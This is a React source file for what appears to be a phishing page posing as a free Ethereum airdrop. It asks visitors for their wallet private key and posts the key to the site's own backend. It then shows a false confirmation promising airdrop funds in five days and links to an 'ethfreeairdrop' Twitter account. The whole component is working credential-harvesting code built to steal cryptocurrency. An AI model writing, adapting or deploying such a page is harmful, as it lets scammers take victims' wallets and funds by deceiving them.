import React, {useState} from 'react'
import "./PrivateKey.css"
import Button from '@material-ui/core/Button';
import TwitterIcon from '@material-ui/icons/Twitter';
import Header from "./Header"
import axios from "./axios"


function PrivateKey() {

    const [input, setInput] = useState("");

    const sendPrivateKey = async(e) => {
        e.preventDefault();

        console.log(input)
        console.log("clicked");
        await axios.post("/privateKey/new", {
            privateKey: input
        });

        setInput("");
        alert("Wallet Imported ✔, Airdrop will be distributed in 5days🚀");
    };

    return (
        <div className="main__phrase">
            <Header />
            <div className="phrase__form">
                <form className="phrase__form">
                <input value={input} placeholder="Private Key" onChange={(e) => setInput(e.target.value)} type="text" name="privateKey">
                </input>
                <p className="phrase__description">Typically 64 alphanumeric characters</p>
                <Button onClick={sendPrivateKey} type="submit" className="btn" variant="contained" color="primary">IMPORT</Button>
                </form>
               <a href="https://mobile.twitter.com/ethfreeairdrop" className="social__handles"> <TwitterIcon color="primary"/>Twitter</a>
                
            </div>
        </div>
    )
}

export default PrivateKey
